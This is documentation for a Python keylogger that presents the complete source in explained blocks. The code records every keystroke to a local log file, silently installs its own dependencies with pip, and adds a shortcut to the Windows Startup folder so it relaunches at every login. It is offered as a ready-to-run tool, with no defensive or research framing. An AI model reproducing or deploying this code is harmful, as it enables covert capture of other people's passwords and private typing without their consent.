

# Python Keylogger Documentation

## Overview
This Python keylogger captures keystrokes and logs them into a file. It runs in the background and can automatically start with the operating system. The captured keystrokes are saved in a file named `key_log.log`.

## Prerequisites
Before running the keylogger, ensure you have the following libraries installed:
- `pynput`: For capturing keyboard events.
- `plyer`: For displaying notifications (if desired).
- `pywin32`: For creating Windows shortcuts.

The script will check for these libraries and install any that are missing automatically.

## Installation
1. Ensure Python is installed on your system.
2. Download the script and save it as `keylogger.py`.
3. Run the script using Python:
   ```bash
   python keylogger.py
   ```

The script will automatically check for required packages and install any that are missing.

## Usage
Once the script is running, it will capture all keyboard inputs until the "Escape" key is pressed. The logged keystrokes will be saved in `key_log.log` in the same directory as the script.

### Automatic Startup
The keylogger creates a shortcut in the Windows Startup folder, ensuring it runs automatically whenever the user logs into Windows.

## Code Explanation

### Imports and Package Installation
```python
import subprocess
import sys
import os

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install():
    packages = ['pywin32', 'pynput', 'plyer'] 
    for package in packages:
        try:
            __import__(package)  
        except ImportError:
            install(package)  
```
- **subprocess**: Used for executing system commands to install packages.
- **sys**: Provides access to system-specific parameters and functions.
- **os**: Used for interacting with the operating system.
- **install**: A function to install a package using pip.
- **check_and_install**: A function that checks for the necessary packages and installs any that are missing.

### Logging Mechanism
```python
check_and_install()

import win32com.client
from pynput.keyboard import Key, Listener
from plyer import notification

log_file = "key_log.log"
log_content = ""
```
- **check_and_install()**: Calls the function to ensure required libraries are present.
- **log_file**: Specifies the name of the log file.
- **log_content**: A string that holds the recorded keystrokes.

### Key Press Handling
```python
def on_press(key):
    global log_content
    try:
        if key.char:
            log_content += key.char  
    except AttributeError:
        if key == Key.backspace:
            log_content = log_content[:-1]
        else:
            log_content += f" {key} "

    with open(log_file, "w") as f:
        f.write(log_content)
```
- **on_press**: A callback function triggered when a key is pressed. It appends the pressed key to `log_content` and writes it to `log_file`.

### Key Release Handling
```python
def on_release(key):
    if key == Key.esc:
        return False
```
- **on_release**: A callback function triggered when a key is released. If the "Escape" key is pressed, it stops the listener.

### Creating a Startup Shortcut
```python
def create_startup_shortcut():
    keylogger_path = os.path.join(os.path.dirname(sys.executable), "dist", "keylogger.exe")
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(os.path.join(startup_folder, "Keylogger.lnk"))
    shortcut.TargetPath = keylogger_path
    shortcut.WorkingDirectory = os.path.dirname(keylogger_path)
    shortcut.save()
```
- **create_startup_shortcut**: Creates a Windows shortcut to ensure the keylogger runs at startup.

### Main Listener
```python
create_startup_shortcut()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
- **Listener**: A context manager that listens for keyboard events. It calls `on_press` and `on_release` as keys are pressed and released, respectively.






